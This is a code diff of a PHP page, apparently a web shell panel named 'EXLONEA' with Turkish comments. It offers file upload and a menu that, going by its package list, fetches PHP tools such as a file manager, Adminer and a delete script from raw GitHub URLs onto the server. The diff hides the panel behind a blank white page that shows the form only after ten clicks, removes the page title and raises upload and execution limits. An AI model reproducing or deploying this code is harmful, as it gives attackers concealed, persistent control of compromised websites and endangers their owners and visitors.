@@ -1,8 +1,11 @@
 <?php
+ini_set('upload_max_filesize', '100M'); 
+ini_set('post_max_size', '110M');
+ini_set('max_execution_time', 300);
+ini_set('memory_limit', '256M');
 $uploadDir = 'exlonea/';
 $successMessage = "";
 $uploadedFileLink = ""; // En son yüklenen dosyanın linkini tutacak değişken
-
 
 // Dosya yükleme işlemi
 if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file'])) {
@@ -117,8 +120,6 @@ if (isset($_GET['package'])) {
 		73 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/73.php", "73.php"],
 		74 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/74.php", "74.php"],
 		75 => ["https://raw.githubusercontent.com/k36t61/k36t61/refs/heads/main/75.php", "75.php"],
-		
-        // İlerleyen zamanlarda başka paketler eklemek için buraya yeni elemanlar ekleyebilirsiniz.
     ];
 
     $packageNumber = intval($_GET['package']);
@@ -148,12 +149,12 @@ $currentFile = basename($_SERVER['PHP_SELF']);
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EXLONEA - Dosya Yükleme</title>
+    <title></title>
     <link href="https://fonts.googleapis.com/css2?family=Cinzel+Decorative:wght@400&display=swap" rel="stylesheet">
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #ffffff; /* Arka plan rengini beyaz yap */
+            background-color: #f4f4f4;
             margin: 0;
             display: flex;
             justify-content: center;
@@ -162,19 +163,22 @@ $currentFile = basename($_SERVER['PHP_SELF']);
             flex-direction: column;
             padding: 0 15px;
             box-sizing: border-box;
+            background-color: white; /* İlk başta beyaz ekran */
         }
-        .container {
-            width: 100%;
-            max-width: 400px;
-            background: white;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
-            text-align: center;
-            margin: 10px 0;
-            box-sizing: border-box;
-            border: 3px solid #000000; /* Çerçeve rengini butonlarla aynı yap */
-        }
+.container {
+    width: 100%;
+    max-width: 400px;
+    background: white;
+    padding: 20px;
+    border-radius: 10px;
+    box-shadow: 0 0 20px rgba(0, 0, 0, 0.3); /* Hafif gölge */
+    text-align: center;
+    margin: 10px 0;
+    box-sizing: border-box;
+    display: none; /* Form başlangıçta gizli */
+    border: 3px solid #000000; /* Kırmızı çerçeve */
+}
+
         .header {
             background-color: #000000;
             padding: 15px;
@@ -186,7 +190,7 @@ $currentFile = basename($_SERVER['PHP_SELF']);
             font-size: 40px;
             color: white;
             letter-spacing: 2px;
-            font-weight: 400; /* İnce yazı stili için bu kısmı değiştirdim */
+            font-weight: 400;
         }
         .header h1 span {
             color: #ffffff;
@@ -257,10 +261,14 @@ $currentFile = basename($_SERVER['PHP_SELF']);
         .dropdown-menu a:hover {
             background-color: #d4edda;
         }
+        .footer {
+            color:#a2a2a2;
+            display: none; /* Başlangıçta gizli */
+        }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="container" id="formContainer">
         <div class="header">
             <a href="<?php echo $currentFile; ?>"><h1>e<span>X</span>lONeA</h1></a>
         </div>
@@ -268,7 +276,7 @@ $currentFile = basename($_SERVER['PHP_SELF']);
         <form action="" method="POST" enctype="multipart/form-data">
             <div class="dropdown" onclick="document.getElementById('fileInput').click();">Dosya Seç</div>
             <input type="file" id="fileInput" name="file" style="display: none;" required onchange="updateFileName()">
-            <span id="fileName" style="display: block; margin-top: 10px; font-weight: bold;"></span> <!-- Seçilen dosya adını gösterecek alan -->
+            <span id="fileName" style="display: block; margin-top: 10px; font-weight: bold;"></span>
             <button type="submit">Yükle</button>
         </form>
 
@@ -354,27 +362,38 @@ $currentFile = basename($_SERVER['PHP_SELF']);
 			<a href="?package=73">FILEMANAGER</a>
 			<a href="?package=74">ADMINER</a>
 			<a href="?package=75">DELETE</a>
-		
-            
-            
         </div>
 
         <?php if ($successMessage) echo $successMessage; ?>
     </div>
-    <div class="footer" style="color:#a2a2a2;">Copyright © Exlonea - 2025</div>
+    <div class="footer" id="footerText">Copyright © Exlonea - 2025</div>
 
-    <script>
-        function toggleMenu() {
-            var menu = document.getElementById("packageMenu");
-            menu.style.display = (menu.style.display === "block" ? "none" : "block");
-        }
+<script>
+    var clickCount = 0;
 
-        // Dosya adı güncelleme fonksiyonu
-        function updateFileName() {
-            var fileInput = document.getElementById('fileInput');
-            var fileName = document.getElementById('fileName');
-            fileName.textContent = fileInput.files[0] ? fileInput.files[0].name : ''; // Seçilen dosyanın adını göster
+    document.body.addEventListener('click', function() {
+        clickCount++;
+        if (clickCount >= 10) {
+            document.getElementById('formContainer').style.display = 'block';
+            document.getElementById('footerText').style.display = 'block'; 
+            
+            // Arka planı gri yap
+            document.body.style.backgroundColor = "#ffffff";
         }
-    </script>
+    });
+
+    function toggleMenu() {
+        var menu = document.getElementById("packageMenu");
+        menu.style.display = (menu.style.display === "block" ? "none" : "block");
+    }
+
+    function updateFileName() {
+        var fileInput = document.getElementById('fileInput');
+        var fileName = document.getElementById('fileName');
+        fileName.textContent = fileInput.files[0] ? fileInput.files[0].name : 'Seçilen dosya yok';
+        fileName.style.display = "block"; // Seçilen dosya adını göstermek için
+    }
+</script>
+
 </body>
 </html>
